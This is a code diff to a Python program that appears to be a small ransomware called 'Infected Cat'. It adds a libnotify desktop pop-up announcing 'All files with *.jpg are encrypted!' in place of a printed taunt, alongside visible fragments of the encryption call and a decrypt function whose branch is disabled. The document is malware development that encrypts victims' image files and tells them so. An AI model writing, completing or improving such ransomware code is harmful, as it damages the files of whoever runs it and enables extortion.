@@ -1,6 +1,19 @@
 import pickle
 import os
+import ctypes
 
+def notification(title, message):
+    libnotify = ctypes.CDLL('libnotify.so.4')
+    libnotify.notify_init.argtypes = [ctypes.c_char_p]
+    libnotify.notify_init.restype = None
+    libnotify.notify_init(b"Notification")
+    notification = libnotify.notify_notification_new(
+        ctypes.c_char_p(title.encode('utf-8')),
+        ctypes.c_char_p(message.encode('utf-8')),
+        None
+    )
+    libnotify.notify_notification_show(notification, None)
+    libnotify.notify_uninit()
 
 def decrypt(n: int, d: int, file: str):
     with open(file, "rb") as f:
@@ -35,7 +48,8 @@ def main():
                     65535,
                     pic,
                 )
-                print("Hahaha, Your file has been encrypted")
+                notification("Infected Cat","All files with *.jpg are encrypted!");
+                # print("Hahaha, Your file has been encrypted")
             elif False:
                 # print('decrpting')
                 decrypt(
